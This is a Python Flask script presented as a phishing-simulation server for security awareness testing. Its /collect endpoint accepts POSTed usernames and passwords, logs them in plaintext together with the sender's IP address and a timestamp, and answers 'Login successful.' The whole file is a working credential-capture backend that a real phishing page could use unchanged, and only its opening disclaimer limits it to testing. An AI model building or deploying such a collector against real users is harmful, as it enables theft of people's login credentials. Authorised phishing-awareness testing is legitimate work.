#!/usr/bin/env python3
"""
sandbox_server.py
-----------------
Phishing credential collection simulation server.
For educational and controlled security awareness testing only.
"""

from flask import Flask, request
import datetime
import os

# ==== CONFIG ====
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 5000       # Non-root friendly port
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "phish_logs.txt")

# Ensure log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

app = Flask(__name__)

@app.route("/collect", methods=["POST"])
def collect():
    """
    Receives POSTed credentials and logs them to a file.
    """
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    ip_address = request.remote_addr

    if not username or not password:
        return "Missing username or password", 400

    log_entry = f"{datetime.datetime.now()} - IP: {ip_address} - USERNAME: {username} - PASSWORD: {password}\n"

    with open(LOG_FILE, "a") as log_file:
        log_file.write(log_entry)

    return "Login successful. (Test Capture Complete)", 200


if __name__ == "__main__":
    print(f"[+] Sandbox server running on http://{HOST}:{PORT}")
    print(f"[+] Logging captured data to: {LOG_FILE}")
    app.run(host=HOST, port=PORT)
